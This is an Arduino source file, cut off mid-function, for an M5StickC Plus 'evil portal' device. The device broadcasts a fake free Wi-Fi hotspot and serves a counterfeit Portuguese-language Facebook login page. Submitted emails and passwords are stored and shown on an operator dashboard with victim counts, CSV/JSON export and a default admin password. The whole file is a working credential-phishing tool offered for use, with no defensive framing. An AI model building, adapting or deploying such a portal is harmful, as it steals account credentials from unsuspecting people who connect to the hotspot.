#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>
 
 
// Based on https://community.dfrobot.com/makelog-313463.html
// Modified font and text placement for StickC-Plus, further improvements added
// Code BY: https://github.com/n0xa/
// Moded BY: https://github.com/Kuush01
// Moded BY: https://github.com/raphntc

 
// User configuration (defaults; SSID and admin login are overridable at
// runtime from the /settings page and persisted to flash)
#define SSID_NAME "Wi-Fi Gratis"
#define SUBTITLE "E-CORP service."
#define POST_TITLE "Validando Acesso..."
#define POST_BODY "Sua conta esta sendo validada. Aguarde ate 5 minutos pela conexao do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
#define ADMIN_USER_DEF "admin"      // default dashboard login user
#define ADMIN_PASS_DEF "huebr"      // default dashboard login password

int capcount = 0;           // lifetime captures (shown on the LCD)
int storedCount = 0;        // entries currently held in the ring buffer
int previous = -1;          // last count drawn on screen; -1 forces the first redraw
const int BUILTIN_LED = 10; // M5StickC Plus internal LED (active LOW)

// Captured credentials are kept in a fixed-size ring buffer (newest overwrites
// oldest once full) so RAM use stays bounded no matter how many come in.
#define MAX_CAPTURES 50
struct Capture { String email; String pass; unsigned long ts; };
Capture captures[MAX_CAPTURES];
int capNext = 0;            // ring write index (storedCount says how many valid)

// Non-blocking LED blink state (armed when a capture arrives)
int blinkRemaining = 0;                    // LED toggles left to perform
unsigned long lastBlink = 0;               // millis() of last toggle
const unsigned long BLINK_INTERVAL = 150;  // ms between toggles

// LCD theme (RGB565) + live status-dot state
#define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
#define C_BG      RGB565(15, 17, 21)     // background
#define C_ACCENT  RGB565(24, 119, 242)   // header bar (blue)
#define C_ACCENT2 RGB565(120, 170, 255)  // gateway value (light blue)
#define C_OK      RGB565(48, 163, 108)   // "active" dot
#define C_OKDIM   RGB565(22, 60, 42)     // "active" dot, off phase
#define C_MUTED   RGB565(138, 147, 166)  // labels
#define C_CARD    RGB565(26, 29, 36)     // counter card
#define C_COUNT   RGB565(255, 196, 0)    // victim count (amber)
#define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
#define C_BONE    RGB565(226, 230, 238)  // skull bone, mid tone
#define C_BONE_HI RGB565(255, 255, 255)  // skull bone, highlight
#define C_BONE_SH RGB565(150, 158, 174)  // skull bone, shadow
#define C_BONE_SH2 RGB565(96, 103, 118)  // skull bone, deep shadow / outline
#define C_SOCKET  RGB565(10, 11, 16)     // eye sockets / nasal cavity (near black)
#define C_EYE     RGB565(255, 40, 40)    // skull eyes, bright glow
#define C_EYEDIM  RGB565(120, 16, 16)    // skull eyes, dim glow
bool dotOn = false;

// -------- App menu / state machine --------
// The device boots into a menu (Tools / Configuration / Exit) instead of
// launching the portal straight away. The portal AP + web server only come
// up when the operator chooses Tools > Start Evil Portal.
enum AppState { ST_MENU_MAIN, ST_MENU_TOOLS, ST_MENU_CONFIG, ST_RUNNING };
AppState appState = ST_MENU_MAIN;
int menuSel = 0;              // highlighted row in the current menu
bool portalStarted = false;  // AP + web server currently up?

// Configuration options (toggled from the Configuration menu / web settings;
// all persisted to flash via Preferences and reloaded on boot)
bool soundOn = true;             // beep when a credential is captured
bool ledBlinkOn = true;          // blink the LED when a credential is captured
uint8_t brightLevel = 2;         // screen brightness index (0..2)
const uint8_t BRIGHT_VALS[3] = {8, 11, 14};
uint8_t screenRot = 3;           // LCD rotation (1 or 3 = landscape, flipped)

String  cfgSsid   = SSID_NAME;         // broadcast AP name (runtime-settable)
String  adminUser = ADMIN_USER_DEF;    // /admin login user
String  adminPass = ADMIN_PASS_DEF;    // /admin login password
bool    authOn    = true;              // require login to reach /admin
uint8_t autoRefresh = 15;              // dashboard auto-refresh seconds (0 = off)
Preferences prefs;                     // NVS-backed settings store
 
// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway
 
unsigned long lastTick = 0;
DNSServer dnsServer; WebServer webServer(80);
 
String input(String argName) {
  String a = webServer.arg(argName);
  a = a.substring(0, 200);  // actually limit length (substring returns a copy)
  a.replace("&", "&amp;");  // escape & first so later entities aren't double-escaped
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.replace("\"", "&quot;");
  return a;
}

// Format a millis() value as H:MM:SS (used for "captured at" and uptime).
String fmtUptime(unsigned long ms) {
  unsigned long s = ms / 1000;
  char buf[16];
  snprintf(buf, sizeof(buf), "%lu:%02lu:%02lu", s / 3600, (s % 3600) / 60, s % 60);
  return String(buf);
}

// -------- Capture ring buffer --------

// Store one capture, overwriting the oldest once the buffer is full.
void addCapture(const String &email, const String &pass) {
  captures[capNext].email = email;
  captures[capNext].pass  = pass;
  captures[capNext].ts    = millis();
  capNext = (capNext + 1) % MAX_CAPTURES;
  if (storedCount < MAX_CAPTURES) storedCount++;
  capcount++;
}

// Ring index of the i-th newest entry (0 = most recent).
int capIdx(int i) {
  return (capNext - 1 - i + MAX_CAPTURES * 2) % MAX_CAPTURES;
}

// Count distinct (case-insensitive) e-mail addresses currently stored.
int uniqueEmails() {
  int u = 0;
  for (int i = 0; i < storedCount; i++) {
    String a = captures[capIdx(i)].email; a.toLowerCase();
    bool seen = false;
    for (int j = 0; j < i; j++) {
      String b = captures[capIdx(j)].email; b.toLowerCase();
      if (a == b) { seen = true; break; }
    }
    if (!seen) u++;
  }
  return u;
}

// Wipe all stored captures (keeps the lifetime counter unless asked).
void clearCaptures(bool resetLifetime) {
  for (int i = 0; i < MAX_CAPTURES; i++) { captures[i].email = ""; captures[i].pass = ""; captures[i].ts = 0; }
  storedCount = 0;
  capNext = 0;
  if (resetLifetime) capcount = 0;
}

// -------- Settings persistence (NVS) --------

void loadSettings() {
  prefs.begin("portal", true);  // read-only
  soundOn     = prefs.getBool("beep", true);
  ledBlinkOn  = prefs.getBool("led", true);
  brightLevel = prefs.getUChar("bright", 2);
  screenRot   = prefs.getUChar("rot", 3);
  cfgSsid     = prefs.getString("ssid", SSID_NAME);
  adminUser   = prefs.getString("auser", ADMIN_USER_DEF);
  adminPass   = prefs.getString("apass", ADMIN_PASS_DEF);
  authOn      = prefs.getBool("auth", true);
  autoRefresh = prefs.getUChar("refresh", 15);
  prefs.end();
  if (brightLevel > 2) brightLevel = 2;
  if (screenRot != 1 && screenRot != 3) screenRot = 3;
  if (autoRefresh > 120) autoRefresh = 120;
  if (cfgSsid.length() == 0) cfgSsid = SSID_NAME;
  if (adminUser.length() == 0) adminUser = ADMIN_USER_DEF;
}

void saveSettings() {
  prefs.begin("portal", false);  // read-write
  prefs.putBool("beep", soundOn);
  prefs.putBool("led", ledBlinkOn);
  prefs.putUChar("bright", brightLevel);
  prefs.putUChar("rot", screenRot);
  prefs.putString("ssid", cfgSsid);
  prefs.putString("auser", adminUser);
  prefs.putString("apass", adminPass);
  prefs.putBool("auth", authOn);
  prefs.putUChar("refresh", autoRefresh);
  prefs.end();
}

// -------- Web helpers --------

// Gate the operator-only endpoints behind HTTP Basic Auth when enabled.
bool requireAuth() {
  if (!authOn) return true;
  if (!webServer.authenticate(adminUser.c_str(), adminPass.c_str())) {
    webServer.requestAuthentication(BASIC_AUTH, "Portal Evil HUEBR", "Login required");
    return false;
  }
  return true;
}

// Escape a value for safe use inside an HTML attribute (e.g. form values).
String attrEsc(String s) {
  s.replace("&", "&amp;");
  s.replace("\"", "&quot;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  return s;
}

// Escape one field for CSV (RFC-4180: wrap in quotes, double internal quotes).
String csvField(String s) {
  s.replace("\"", "\"\"");
  return "\"" + s + "\"";
}

// Escape one string for embedding in JSON.
String jsonStr(String s) {
  s.replace("\\", "\\\\");
  s.replace("\"", "\\\"");
  s.replace("\n", "\\n");
  s.replace("\r", "");
  return "\"" + s + "\"";
}

// Build the captures export as CSV (newest first).
String buildCsv() {
  String s = "index,email,password,uptime,ms\r\n";
  for (int i = 0; i < storedCount; i++) {
    Capture &c = captures[capIdx(i)];
    s += String(storedCount - i) + "," + csvField(c.email) + "," + csvField(c.pass) +
         "," + csvField(fmtUptime(c.ts)) + "," + String(c.ts) + "\r\n";
  }
  return s;
}

// Build the captures export as a JSON document.
String buildJson() {
  String s = "{\"ssid\":" + jsonStr(cfgSsid) +
             ",\"stored\":" + String(storedCount) +
             ",\"lifetime\":" + String(capcount) +
             ",\"uptime_ms\":" + String(millis()) +
             ",\"captures\":[";
  for (int i = 0; i < storedCount; i++) {
    Capture &c = captures[capIdx(i)];
    if (i) s += ",";
    s += "{\"email\":" + jsonStr(c.email) + ",\"password\":" + jsonStr(c.pass) +
         ",\"ms\":" + String(c.ts) + "}";
  }
  s += "]}";
  return s;
}

String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}
 
String header(String t) {
  String a = cfgSsid;
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}
 
// Operator dashboard served at /creds. Self-contained dark-theme page:
// stat tiles, a table of captures (newest first), and action buttons.
String creds() {
  String css =
    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--danger:#e5484d}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
    ".top h1{margin:0;font-size:20px;letter-spacing:.3px}"
    ".top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
    ".wrap{max-width:900px;margin:0 auto;padding:16px}"
    ".stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}"
    ".tile{flex:1;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}"
    ".tile .k{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px}"
    ".tile .v{font-size:26px;font-weight:700;margin-top:4px}"
    ".tile .v.accent{color:#8ab0ff}"
    ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 16px}"
    ".btn{display:inline-block;padding:9px 14px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);text-decoration:none;font-size:14px;cursor:pointer}"
    ".btn:hover{border-color:var(--accent)}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".btn.danger{background:transparent;border-color:var(--danger);color:#ff9a9d}"
    ".btn.danger:hover{background:var(--danger);color:#fff}"
    "table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden}"
    "thead th{background:#10131a;color:var(--mut);text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:10px 12px;border-bottom:1px solid var(--line)}"
    "tbody td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-word}"
    "tbody tr:last-child td{border-bottom:none}"
    "tbody tr:nth-child(even){background:rgba(255,255,255,.02)}"
    ".idx{color:var(--mut);width:42px}"
    ".pass code{background:#0c0f14;border:1px solid var(--line);border-radius:6px;padding:2px 6px;color:#7ee2b8;font-family:ui-monospace,Menlo,Consolas,monospace}"
    ".time{color:var(--mut);white-space:nowrap}"
    ".empty{background:var(--card);border:1px dashed var(--line);border-radius:12px;padding:44px 20px;text-align:center;color:var(--mut)}"
    ".note{color:var(--mut);font-size:12px;margin:14px 0 30px;text-align:center}";

  // Build the capture table (newest first) from the ring buffer, with a
  // client-side text filter.
  String body;
  if (storedCount == 0) {
    body = "<div class=\"empty\">No credentials captured yet.<br>They will appear here as devices submit the portal form.</div>";
  } else {
    String rows;
    for (int i = 0; i < storedCount; i++) {
      Capture &c = captures[capIdx(i)];
      rows += "<tr><td class=\"idx\">" + String(storedCount - i) + "</td>"
              "<td>" + c.email + "</td>"
              "<td class=\"pass\"><code>" + c.pass + "</code></td>"
              "<td class=\"time\">" + fmtUptime(c.ts) + "</td></tr>";
    }
    body = "<input id=\"f\" class=\"filter\" placeholder=\"Filter by email or password...\" oninput=\"flt()\">"
           "<table id=\"t\"><thead><tr><th class=\"idx\">#</th><th>Email</th><th>Password</th>"
           "<th class=\"time\">Captured (uptime)</th></tr></thead><tbody>" + rows + "</tbody></table>"
           "<script>function flt(){var q=document.getElementById('f').value.toLowerCase();"
           "document.querySelectorAll('#t tbody tr').forEach(function(x){"
           "x.style.display=x.innerText.toLowerCase().indexOf(q)<0?'none':'';});}</script>";
  }

  String refreshMeta = autoRefresh > 0
    ? "<meta http-equiv=\"refresh\" content=\"" + String(autoRefresh) + "\">" : "";
  String refreshNote = autoRefresh > 0
    ? "Auto-refreshes every " + String(autoRefresh) + " s." : "Auto-refresh off.";
  int clients = WiFi.softAPgetStationNum();

  return
    "<!DOCTYPE html><html lang=\"en\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    + refreshMeta +
    "<title>" + attrEsc(cfgSsid) + " :: " + PASS_TITLE + "</title>"
    "<style>" + css +
    ".apinfo{display:flex;flex-wrap:wrap;gap:8px 22px;background:var(--card);border:1px solid var(--line);"
    "border-radius:12px;padding:12px 16px;margin:0 0 16px;font-size:13px;color:var(--mut)}"
    ".apinfo b{color:var(--txt);font-weight:600}"
    ".filter{width:100%;padding:10px 12px;margin:0 0 12px;border-radius:10px;border:1px solid var(--line);"
    "background:var(--card);color:var(--txt);font-size:14px}"
    "</style></head><body>"
    "<div class=\"top\"><h1>Portal Evil HUEBR</h1><p>Operator dashboard</p></div>"
    "<div class=\"wrap\">"
    "<div class=\"stats\">"
    "<div class=\"tile\"><div class=\"k\">Stored</div><div class=\"v accent\">" + String(storedCount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Lifetime</div><div class=\"v\">" + String(capcount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Unique emails</div><div class=\"v\">" + String(uniqueEmails()) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Clients online</div><div class=\"v\">" + String(clients) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Free heap</div><div class=\"v\">" + String(ESP.getFreeHeap() / 1024) + " KB</div></div>"
    "</div>"
    "<div class=\"apinfo\">"
    "<span>SSID <b>" + attrEsc(cfgSsid) + "</b></span>"
    "<span>Gateway <b>" + APIP.toString() + "</b></span>"
    "<span>Channel <b>" + String(WiFi.channel()) + "</b></span>"
    "<span>AP MAC <b>" + WiFi.softAPmacAddress() + "</b></span>"
    "<span>Buffer <b>" + String(storedCount) + "/" + String(MAX_CAPTURES) + "</b></span>"
    "</div>"
    "<div class=\"bar\">"
    "<a class=\"btn primary\" href=\"/admin\">&#8635; Refresh</a>"
    "<a class=\"btn\" href=\"/settings\">&#9881;&#65039; Settings</a>"
    "<a class=\"btn\" href=\"/export.csv\">&#8681; CSV</a>"
    "<a class=\"btn\" href=\"/export.json\">&#8681; JSON</a>"
    "<a class=\"btn danger\" href=\"/clear\" onclick=\"return confirm('Clear all captured credentials? This cannot be undone.')\">Clear all</a>"
    "<a class=\"btn\" href=\"/\">Portal</a>"
    "</div>"
    + body +
    "<p class=\"note\">Stored in RAM (max " + String(MAX_CAPTURES) + ", oldest dropped when full) and lost on reboot. " + refreshNote + "</p>"
    "</div></body></html>";
}

// -------- Settings page (/settings) --------

// Render the web configuration form with the current values filled in.
// `saved` highlights that a POST just applied.
String settingsPage(bool saved) {
  String css =
    ":root{--bg:#0f1115;--card:#171a21;--line:#262b36;--txt:#e6e9ef;--mut:#8a93a6;--accent:#4169e1;--ok:#30a36c}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#1b2a6b,#4169e1);padding:18px 20px}"
    ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
    ".wrap{max-width:680px;margin:0 auto;padding:16px}"
    ".card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin:0 0 16px}"
    ".row{margin:0 0 14px}"
    "label{display:block;color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin:0 0 6px}"
    "input[type=text],input[type=password],input[type=number],select{width:100%;padding:10px 12px;border-radius:10px;"
    "border:1px solid var(--line);background:#10131a;color:var(--txt);font-size:15px}"
    ".chk{display:flex;align-items:center;gap:10px;color:var(--txt);font-size:15px}"
    ".chk input{width:18px;height:18px}"
    ".btn{display:inline-block;padding:10px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);"
    "color:var(--txt);text-decoration:none;font-size:15px;cursor:pointer}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".bar{display:flex;gap:10px;margin-top:8px}"
    ".saved{background:rgba(48,163,108,.15);border:1px solid var(--ok);color:#8ff0c4;border-radius:10px;padding:10px 14px;margin:0 0 16px;font-size:14px}"
    ".hint{color:var(--mut);font-size:12px;margin:4px 0 0}";

  auto opt = [](int v, int cur, const char* label) -> String {
    return "<option value=\"" + String(v) + "\"" + (v == cur ? " selected" : "") + ">" + String(label) + "</option>";
  };

  return
    "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + attrEsc(cfgSsid) + " :: Settings</title><style>" + css + "</style></head><body>"
    "<div class=\"top\"><h1>Settings</h1><p>Portal Evil HUEBR configuration</p></div>"
    "<div class=\"wrap\">"
    + String(saved ? "<div class=\"saved\">\xE2\x9C\x93 Settings saved.</div>" : "") +
    "<form method=\"POST\" action=\"/settings\">"
    "<div class=\"card\">"
    "<div class=\"row\"><label>AP name (SSID)</label>"
    "<input type=\"text\" name=\"ssid\" maxlength=\"31\" value=\"" + attrEsc(cfgSsid) + "\">"
    "<p class=\"hint\">Changing this restarts the access point and disconnects clients.</p></div>"
    "<div class=\"row\"><label>Dashboard auto-refresh (seconds, 0 = off)</label>"
    "<input type=\"number\" name=\"refresh\" min=\"0\" max=\"120\" value=\"" + String(autoRefresh) + "\"></div>"
    "<div class=\"row\"><label>Screen brightness</label><select name=\"bright\">"
    + opt(0, brightLevel, "1 - Low") + opt(1, brightLevel, "2 - Medium") + opt(2, brightLevel, "3 - High") +
    "</select></div>"
    "</div>"
    "<div class=\"card\">"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"beep\" " + String(soundOn ? "checked" : "") + "><span>Beep on capture / boot</span></div>"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"led\" " + String(ledBlinkOn ? "checked" : "") + "><span>LED blink on capture</span></div>"
    "</div>"
    "<div class=\"card\">"
    "<div class=\"row chk\"><input type=\"checkbox\" name=\"auth\" " + String(authOn ? "checked" : "") + "><span>Require login for this dashboard</span></div>"
    "<div class=\"row\"><label>Login user</label>"
    "<input type=\"text\" name=\"auser\" maxlength=\"31\" value=\"" + attrEsc(adminUser) + "\"></div>"
    "<div class=\"row\"><label>Login password</label>"
    "<input type=\"password\" name=\"apass\" maxlength=\"31\" value=\"" + attrEsc(adminPass) + "\">"
    "<p class=\"hint\">You will be asked to log in again after changing credentials.</p></div>"
    "</div>"
    "<div class=\"bar\"><button class=\"btn primary\" type=\"submit\">Save</button>"
    "<a class=\"btn\" href=\"/admin\">Back</a></div>"
    "</form></div></body></html>";
}

// Apply a POSTed settings form: update globals and persist. Returns true if
// the live AP needs restarting (SSID changed) -- the caller does that AFTER
// sending the response so the reply still reaches the client.
bool applySettings() {
  String newSsid = webServer.arg("ssid");
  newSsid = newSsid.substring(0, 31);
  bool ssidChanged = (newSsid.length() > 0 && newSsid != cfgSsid);
  if (newSsid.length() > 0) cfgSsid = newSsid;

  autoRefresh = (uint8_t)constrain(webServer.arg("refresh").toInt(), 0, 120);
  brightLevel = (uint8_t)constrain(webServer.arg("bright").toInt(), 0, 2);
  soundOn    = webServer.hasArg("beep");
  ledBlinkOn = webServer.hasArg("led");
  authOn     = webServer.hasArg("auth");

  String u = webServer.arg("auser"); u = u.substring(0, 31);
  String p = webServer.arg("apass"); p = p.substring(0, 31);
  if (u.length() > 0) adminUser = u;
  adminPass = p;

  applyBrightness();
  saveSettings();
  return ssidChanged && portalStarted;
}
 
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}
 
// Standalone "please wait / validating" page shown after a submission.
// Pure CSS/JS (device is offline): animated Wi-Fi icon, indeterminate progress
// bar, spinner and a live countdown. Text comes from POST_TITLE / POST_BODY.
String waiting() {
  return
    "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<title>" + String(POST_TITLE) + "</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(160deg,#eef3fb,#dce7f7);font-family:Helvetica,Arial,sans-serif;color:#1c1e21;padding:20px}"
    ".card{background:#fff;width:100%;max-width:380px;border-radius:18px;padding:34px 28px;text-align:center;box-shadow:0 10px 30px rgba(24,119,242,.15),0 2px 8px rgba(0,0,0,.06)}"
    ".wifi{width:76px;height:76px;margin:0 auto 18px}"
    ".wifi svg{width:100%;height:100%}"
    ".a{fill:none;stroke:#1877f2;stroke-width:6;stroke-linecap:round;opacity:.2;animation:pulse 1.8s infinite}"
    ".a2{animation-delay:.2s}.a3{animation-delay:.4s}"
    ".dot{fill:#1877f2}"
    "@keyframes pulse{0%,100%{opacity:.2}40%{opacity:1}}"
    "h1{font-size:22px;color:#1877f2;margin-bottom:10px;font-weight:700}"
    ".msg{font-size:15px;color:#606770;line-height:1.5;margin-bottom:22px}"
    ".track{height:8px;background:#e8edf3;border-radius:99px;overflow:hidden;margin-bottom:18px}"
    ".track i{display:block;height:100%;width:40%;border-radius:99px;background:linear-gradient(90deg,#1877f2,#4fa3ff);animation:slide 1.4s ease-in-out infinite}"
    "@keyframes slide{0%{margin-left:-45%}100%{margin-left:105%}}"
    ".status{display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;color:#8a8d91}"
    ".spin{width:14px;height:14px;border:2px solid #cdd3dc;border-top-color:#1877f2;border-radius:50%;animation:spin .8s linear infinite}"
    "@keyframes spin{to{transform:rotate(360deg)}}"
    ".foot{margin-top:20px;font-size:12px;color:#b0b3b8}"
    "@media(prefers-reduced-motion){.a,.track i,.spin{animation:none}.a{opacity:.75}}"
    "</style></head><body>"
    "<div class=\"card\">"
    "<div class=\"wifi\"><svg viewBox=\"0 0 100 100\">"
    "<path class=\"a a3\" d=\"M15,45 A48,48 0 0 1 85,45\"/>"
    "<path class=\"a a2\" d=\"M27,56 A33,33 0 0 1 73,56\"/>"
    "<path class=\"a\" d=\"M38,66 A19,19 0 0 1 62,66\"/>"
    "<circle class=\"dot\" cx=\"50\" cy=\"74\" r=\"5\"/>"
    "</svg></div>"
    "<h1>" + String(POST_TITLE) + "</h1>"
    "<p class=\"msg\">" + String(POST_BODY) + "</p>"
    "<div class=\"track\"><i></i></div>"
    "<div class=\"status\"><span class=\"spin\"></span>Tempo estimado: <span id=\"t\">5:00</span></div>"
    "<div class=\"foot\">&#128274; Conex&atilde;o segura</div>"
    "</div>"
    "<script>var s=300,el=document.getElementById('t');setInterval(function(){if(s>0)s--;var m=(s/60)|0,x=s%60;el.textContent=m+':'+(x<10?'0'+x:x);},1000);</script>"
    "</body></html>";
}

String posted() {
  addCapture(input("email"), input("password"));
  return waiting();
}

String clear() {
  clearCaptures(false);  // wipe stored entries; keep the lifetime counter
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/admin>Back to dashboard</a></center>" + footer();
}
 
// Arm a non-blocking blink: 5 on/off cycles = 10 toggles.
// The toggling itself happens in updateBlink() from loop(), so DNS/HTTP keep serving.
void startBlink() {
  blinkRemaining = 10;
  lastBlink = millis();
  digitalWrite(BUILTIN_LED, LOW); // LED on (active LOW)
}

void updateBlink() {
  if (blinkRemaining > 0 && (millis() - lastBlink) > BLINK_INTERVAL) {
    lastBlink = millis();
    blinkRemaining--;
    // even remaining -> LED off, odd -> LED on
    digitalWrite(BUILTIN_LED, (blinkRemaining % 2 == 0) ? HIGH : LOW);
    if (blinkRemaining == 0) digitalWrite(BUILTIN_LED, HIGH); // make sure it ends off
  }
}

// -------- LCD UI (240x135, rotation 3) --------

// Small "AP active" dot in the top-right of the header bar.
void drawStatusDot(bool on) {
  M5.Lcd.fillCircle(228, 13, 5, on ? C_OK : C_OKDIM);
}

// Estimate battery charge (0-100%) from the AXP192 pack voltage.
// Li-ion maps ~3.0V (empty) to ~4.07V (full) on the M5StickC Plus.
int getBatteryPct() {
  float v = M5.Axp.GetBatVoltage();
  int pct = (int)(((v - 3.0) / (4.07 - 3.0)) * 100.0 + 0.5);
  if (pct > 100) pct = 100;
  if (pct < 0) pct = 0;
  return pct;
}

// Battery gauge: a cell-shaped icon (body + nub) whose fill tracks the charge
// level, with the percentage printed to its left. The outline/text use
// `fg` and the surrounding area is cleared with `bg` so it can sit on the
// dark body (dashboard) or on the blue header bar (menus).
void drawBatteryAt(int bx, int by, uint16_t fg, uint16_t bg) {
  int pct = getBatteryPct();
  const int bw = 26, bh = 13;
  uint16_t col = (pct > 50) ? C_OK : (pct > 20 ? C_COUNT : C_DANGER);

  // Clear the gauge area (percentage width changes with the digit count).
  M5.Lcd.fillRect(bx - 40, by - 2, 40 + bw + 6, bh + 5, bg);

  // Cell body, terminal nub, and proportional fill.
  M5.Lcd.drawRoundRect(bx, by, bw, bh, 2, fg);
  M5.Lcd.fillRect(bx + bw, by + 4, 3, bh - 8, fg);
  int fw = (bw - 4) * pct / 100;
  M5.Lcd.fillRect(bx + 2, by + 2, fw, bh - 4, col);

  // Percentage to the left of the icon.
  M5.Lcd.setTextDatum(MR_DATUM);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setTextColor(fg, bg);
  M5.Lcd.drawString(String(pct) + "%", bx - 5, by + bh / 2);
}

// Dashboard battery gauge (top-right of the SSID row, on the dark body).
void drawBattery() {
  drawBatteryAt(208, 38, C_MUTED, C_BG);
}

// A shaded bone blob: a deep-shadow rim, a shadow body offset down-right, the
// main bone on top, and a soft highlight up-left -> reads as a 3D form.
void boneBlob(int x, int y, int rx, int ry) {
  M5.Lcd.fillEllipse(x + 1, y + 2, rx + 1, ry + 1, C_BONE_SH2);  // outline/rim
